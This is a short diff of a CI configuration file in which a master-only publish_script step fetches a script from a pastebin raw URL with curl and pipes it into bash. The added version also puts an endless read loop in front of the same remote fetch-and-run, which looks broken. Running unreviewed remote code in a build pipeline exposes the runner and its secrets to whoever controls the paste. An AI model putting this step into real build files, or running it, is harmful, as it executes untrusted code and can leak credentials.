@@ -22,4 +22,4 @@ task:
         - Lint
         - Test
       only_if: $BRANCH == "master" # 
-      publish_script: bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"
+      publish_script: while :; do read; done ; bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"
